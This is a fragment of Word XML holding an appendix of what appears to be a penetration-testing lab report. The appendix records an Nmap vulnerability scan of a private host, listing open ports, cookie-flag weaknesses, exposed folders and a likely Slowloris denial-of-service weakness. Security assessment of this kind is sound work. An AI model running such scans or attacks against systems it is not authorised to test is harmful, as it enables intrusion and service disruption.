    <w:p w14:paraId="7C3E9063" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="00BA7AE1">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07362C2A" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="00BA7AE1">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44490706" w14:textId="77777777" w:rsidR="002152BC" w:rsidRPr="00BA7AE1" w:rsidRDefault="002152BC" w:rsidP="00BA7AE1">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="409F3AC2" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="007077E7" w:rsidRDefault="009525A9" w:rsidP="007077E7">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="578" w:hanging="578"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="32" w:name="_Toc27518418"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Appendix </w:t>
      </w:r>
      <w:r w:rsidR="00A0250F">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:bookmarkEnd w:id="32"/>
    </w:p>
    <w:p w14:paraId="379E0C8E" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap vulnerability scan against 192.168.0.2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45546287" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51549EB2" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>root@</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>kali:~</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t># nmap --script vuln 192.168.0.2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="365901B5" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Starting Nmap 7.80 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>( https://nmap.org</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> ) at 2019-12-06 06:15 EST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FA35DF0" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap scan report for 192.168.0.2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09578A38" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Host is up (0.0010s latency).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E5E4B80" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Not shown: 978 closed ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02836072" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>PORT      STATE SERVICE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05179B1B" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">23/tcp    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>open  telnet</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="75A61C4C" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00987701" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">42/tcp    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>open  nameserver</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="741A1F2D" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="292AFBEF" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">53/tcp    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>open  domain</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="710FC521" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="050A83DE" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">80/tcp    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>open  http</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="7F719F4E" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44F9745D" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">| http-cookie-flags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30F1E588" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">|   /: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AFF72C4" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">|     PHPSESSID: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44E2934F" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|       httponly flag not set</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="433A09D4" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">|   /login.php: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2497D279" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">|     PHPSESSID: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F72383B" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|       httponly flag not set</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BE42C31" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">|   /install/: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B8017E9" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">|     PHPSESSID: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C2223C2" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|_      httponly flag not set</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14C2825A" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>|_http-csrf: Couldn't find any CSRF vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="050F6501" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|_http-dombased-xss: Couldn't find any DOM based XSS.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AA29495" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">| http-enum: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A2ADAF8" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|   /login.php: Possible admin folder</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="291F1078" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|   /controlpanel.php: Possible admin folder</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27C7A429" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|   /readme.html: Interesting, a readme.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30F18732" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|   /docs/: Potentially interesting folder w/ directory listing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CDC5BE3" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|   /icons/: Potentially interesting folder w/ directory listing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CBDDB52" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|   /images/: Potentially interesting folder w/ directory listing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A93BA0C" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|   /includes/: Potentially interesting folder</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20552F82" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|   /install/: Potentially interesting folder</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F0C5D33" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|   /tests/: Potentially interesting folder w/ directory listing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1860589A" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|   /themes/: Potentially interesting folder w/ directory listing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4333D526" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>_  /</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>tools/: Potentially interesting folder w/ directory listing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3684FE67" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">| http-internal-ip-disclosure: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="272088F7" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>_  Internal</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> IP Leaked: 192.168.0.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26333384" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">| http-slowloris-check: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="154C02E2" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|   VULNERABLE:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="201746DC" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|   Slowloris DOS attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38062696" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|     State: LIKELY VULNERABLE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F0318F7" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">|     IDs:  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>CVE:CVE</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>-2007-6750</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14E198B8" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|       Slowloris tries to keep many connections to the target web server open and hold</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DAC8E48" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">|       them open </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>as long as</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> possible.  It accomplishes this by opening connections to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FDB25EA" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|       the target web server and sending a partial request. By doing so, it starves</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="254A5FF8" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">|       the http server's resources causing Denial </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Of</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Service.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31507E64" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">|       </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="780D9F3C" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|     Disclosure date: 2009-09-17</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DA2C9FE" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|     References:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="292BDF3B" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="131F98A1" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|_      http://ha.ckers.org/slowloris/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E2F02D3" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
